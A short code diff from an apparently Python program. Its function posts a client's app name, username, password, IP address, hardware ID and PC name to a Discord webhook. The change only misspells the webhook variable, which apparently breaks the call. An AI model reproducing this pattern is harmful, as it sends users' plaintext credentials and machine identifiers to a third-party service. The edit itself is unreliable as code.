@@ -216,7 +216,7 @@ def send_client_login(app_name, username, password, ip, hwid, pc_name):
             ]
         }
 
-        requests.post(DISCORD_WEBHOOK, json=data)
+        requests.post(DISCORD_WEBHOOKK, json=data)
 
     except Exception as e:
         print("Webhook error:", e)
